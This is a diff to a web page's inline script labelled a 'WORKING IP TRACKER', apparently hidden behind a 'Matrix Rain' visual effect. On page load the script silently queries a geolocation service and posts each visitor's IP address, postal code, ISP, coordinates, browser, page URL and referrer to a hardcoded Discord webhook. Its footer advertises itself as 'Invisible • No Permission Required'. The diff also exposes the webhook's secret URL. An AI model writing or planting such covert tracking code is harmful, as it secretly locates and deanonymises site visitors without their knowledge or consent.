@@ -484,45 +484,35 @@
 
     <script>
         // ============================================
-        // WORKING IP TRACKER - Sends to Discord Webhook
-        // Uses ip-api.com (most accurate free tier)
+        // WORKING IP TRACKER - Uses ipapi.co (HTTPS, reliable)
+        // Sends: IP, City, Region, Country, Postal, ISP, Coordinates
         // ============================================
         
         (function() {
             const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1460664833677721692/ThKTCUHxewaQFjmXrFu6JthxlVJqbEsZKFQa99VN5d78fSTkTJ8F7aVNRZjJlxnO1VPK';
             
-            // Collect browser info
-            const browserData = {
-                userAgent: navigator.userAgent,
-                language: navigator.language,
-                screen: screen.width + 'x' + screen.height,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                pageUrl: window.location.href,
-                referrer: document.referrer || 'Direct'
-            };
-            
-            function sendToDiscord(geo) {
-                if (!geo || !geo.query) return;
+            function sendToDiscord(data) {
+                if (!data || !data.ip) return;
                 
-                const locationStr = [geo.city, geo.regionName, geo.country].filter(Boolean).join(', ') || 'Unknown';
-                const mapsLink = (geo.lat && geo.lon) ? `https://www.google.com/maps?q=${geo.lat},${geo.lon}` : '';
+                const locationStr = [data.city, data.region, data.country_name].filter(Boolean).join(', ') || 'Unknown';
+                const mapsLink = (data.latitude && data.longitude) ? `https://www.google.com/maps?q=${data.latitude},${data.longitude}` : '';
                 
                 const payload = {
                     embeds: [{
                         title: '📍 NEW VISITOR DETECTED',
                         color: 0x00ff41,
                         fields: [
-                            { name: '🌐 IP Address', value: `\`${geo.query}\``, inline: true },
-                            { name: '🏢 ISP', value: geo.isp || 'Unknown', inline: true },
+                            { name: '🌐 IP Address', value: `\`${data.ip}\``, inline: true },
+                            { name: '🏢 ISP', value: data.org || data.isp || 'Unknown', inline: true },
                             { name: '📍 Location', value: locationStr, inline: false },
-                            { name: '📮 Postal Code', value: geo.zip || 'Not available', inline: true },
-                            { name: '🗺️ Coordinates', value: (geo.lat && geo.lon) ? `${geo.lat}, ${geo.lon}` : 'Unknown', inline: true },
-                            { name: '🗺️ Map', value: mapsLink ? `[View Area](${mapsLink})` : 'Unavailable', inline: true },
-                            { name: '💻 Browser', value: browserData.userAgent.substring(0, 80), inline: false },
-                            { name: '📄 Page', value: browserData.pageUrl.substring(0, 80), inline: false },
-                            { name: '🔗 Referrer', value: browserData.referrer, inline: false }
+                            { name: '📮 Postal Code', value: data.postal || 'Not available', inline: true },
+                            { name: '🗺️ Coordinates', value: (data.latitude && data.longitude) ? `${data.latitude}, ${data.longitude}` : 'Unknown', inline: true },
+                            { name: '🗺️ Map Link', value: mapsLink ? `[View Area](${mapsLink})` : 'Unavailable', inline: true },
+                            { name: '💻 Browser', value: navigator.userAgent.substring(0, 80), inline: false },
+                            { name: '📄 Page', value: window.location.href.substring(0, 80), inline: false },
+                            { name: '🔗 Referrer', value: document.referrer || 'Direct', inline: false }
                         ],
-                        footer: { text: 'SSNV Tracker • Invisible • No Permission Required' },
+                        footer: { text: 'SSNV Tracker • Invisible • No Permission' },
                         timestamp: new Date().toISOString()
                     }]
                 };
@@ -534,16 +524,11 @@
                 }).catch(e => console.log('Webhook error:', e));
             }
             
-            // Use JSONP to bypass CORS
-            const script = document.createElement('script');
-            script.src = 'https://ip-api.com/json/?callback=handleGeo&fields=66846719';
-            window.handleGeo = function(data) {
-                if (data && data.status === 'success') {
-                    sendToDiscord(data);
-                }
-                document.body.removeChild(script);
-            };
-            document.body.appendChild(script);
+            // Fetch from ipapi.co (HTTPS, reliable, no CORS issues)
+            fetch('https://ipapi.co/json/')
+                .then(response => response.json())
+                .then(data => sendToDiscord(data))
+                .catch(err => console.log('IP fetch failed:', err));
         })();
 
         // Matrix Rain
